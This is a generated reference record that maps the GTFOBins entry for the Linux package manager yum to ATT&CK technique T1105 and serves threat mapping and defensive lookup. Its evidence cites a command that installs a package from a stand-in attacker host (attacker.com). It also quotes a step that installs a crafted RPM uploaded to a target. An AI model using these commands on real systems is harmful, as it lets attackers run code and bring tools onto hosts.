---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# yum

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `yum` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/yum` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for yum covering command, download, inherit.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/yum.md)
- Source verification: [source record](../../sources/gtfobins/yum.md)

## Aliases

- `yum`

## Related ATT&CK Techniques

| Item | Relationship | Confidence | Evidence |
| --- | --- | --- | --- |
| [T1105 - Ingress Tool Transfer](../../attack/techniques/T1105-ingress-tool-transfer.md) | inferred | high | Command appears to retrieve a remote file: yum install http://attacker.com/path/to/input-file.rpm |

## Source Verification

[source record](../../sources/gtfobins/yum.md)

## Evidence Excerpt

````text
_body: ''
_name: yum
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/yum
functions:
command:
- code: yum localinstall -y x-1.0-1.noarch.rpm
comment: 'Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.
```
````
